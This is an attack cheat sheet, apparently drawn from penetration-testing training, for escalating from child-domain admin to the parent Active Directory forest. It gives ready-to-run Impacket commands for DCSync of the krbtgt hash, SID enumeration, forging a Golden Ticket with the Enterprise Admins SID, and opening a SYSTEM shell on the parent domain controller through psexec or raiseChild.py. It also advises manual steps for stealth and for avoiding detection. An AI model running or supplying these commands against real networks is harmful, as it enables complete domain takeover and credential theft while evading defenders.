## Methodology

1. **Verify Child Domain Admin**
    - Confirm complete control of the child domain (e.g., `LOGISTICS.INLANEFREIGHT.LOCAL`) to enable DCSync.
2. **Select Escalation Path**
    - **Manual**: Use for better control, troubleshooting, and avoiding "autopwn" detection in sensitive production environments.
    - **Automated**: Use `raiseChild.py` for rapid escalation if manual precision is not a priority.
3. **Information Gathering (Manual Path)**
    - Execute DCSync to pull the `krbtgt` NTLM hash.
    - Enumerate the Child Domain SID.
    - Enumerate the Parent Domain SID and locate the Enterprise Admins RID (519).
4. **Ticket Forgery and Injection**
    - Generate a Golden Ticket including the Parent Enterprise Admins SID in the `ExtraSids` array.
    - Load the ticket into the current session via environment variables.
5. **Execution**
    - Authenticate to the Parent Domain Controller to receive a SYSTEM shell.

---

## DCSync Child Domain Credentials

When you have administrative control over the child domain and need the `krbtgt` NTLM hash for ticket forgery.

DCSync the `krbtgt` account using secretsdump

```
secretsdump.py <DOMAIN>/<USERNAME>@<DC_IP> -just-dc-user <DOMAIN>/krbtgt
```

**Gotchas**

- **Insufficient privileges** will prevent the DRSUAPI method from dumping secrets.

## Enumerate Domain SIDs

When identifying the unique SIDs for both child and parent domains to construct the PAC `ExtraSids` array.

Perform SID brute forcing against the child DC

```
lookupsid.py <DOMAIN>/<USERNAME>@<DC_IP> | grep "Domain SID"
```

Identify the Parent Domain SID and Enterprise Admins RID by targeting the forest root DC

```
lookupsid.py <DOMAIN>/<USERNAME>@<PARENT_DC_IP> | grep -B12 "Enterprise Admins"
```

**Gotchas**

- **Targeting the wrong DC** provides the local domain SID instead of the required parent/forest SID.

## Forge Golden Ticket with SID History

When you have the child `krbtgt` hash, the child domain SID, and the parent domain SID with the Enterprise Admins RID (519).

Construct the cross-domain Golden Ticket

```
ticketer.py -nthash <HASH> -domain <DOMAIN> -domain-sid <CHILD_SID> -extra-sid <PARENT_SID>-519 <USERNAME>
```

**Gotchas**

- **Malformed SID strings** in the `-extra-sid` flag will cause authentication failure during the cross-domain request.

## Execute Remote Shell on Parent DC

When the `.ccache` file is generated and you need to pivot to the Parent DC.

Inject the forged ticket into the session

```
export KRB5CCNAME=<FILE_PATH>
```

Execute a SYSTEM shell on the Parent DC via Kerberos

```
psexec.py <DOMAIN>/<USERNAME>@<DC_FQDN> -k -no-pass -target-ip <TARGET_IP>
```

> ⚠️ Gap: Kerberos authentication typically requires valid DNS resolution for the `<DC_FQDN>` in `/etc/hosts` or `/etc/resolv.conf`; providing only the IP via `-target-ip` may still fail if the SPN cannot be validated.

**Gotchas**

- **Clock desynchronization** between the attack host and the DC will invalidate Kerberos tickets.

## Automated Child-to-Parent Escalation

When administrative credentials for the child domain are available and rapid escalation is preferred over manual steps.

Automate the full escalation process including a PSExec shell

```
raiseChild.py -target-exec <PARENT_DC_IP> <DOMAIN>/<USERNAME>
```

### Tool Comparison

- **raiseChild.py**
    - `raiseChild.py -target-exec <TARGET_IP> <DOMAIN>/<USERNAME>`
    - Prefer for speed; automates SID discovery, `krbtgt` dumping, and ticket forgery.
- **Manual (ticketer/psexec)**
    - Standard Impacket workflow.
    - Prefer for stealth and troubleshooting when automated scripts fail or are blocked.

**Dangerous / misconfigured settings**

- Using "autopwn" scripts in production environments can lead to unpredictable breakage or high-visibility alerts.

**Gotchas**

- **Script failure** leaves the operator without context on which specific stage (DCSync, SID lookup, or Ticket Forgery) failed.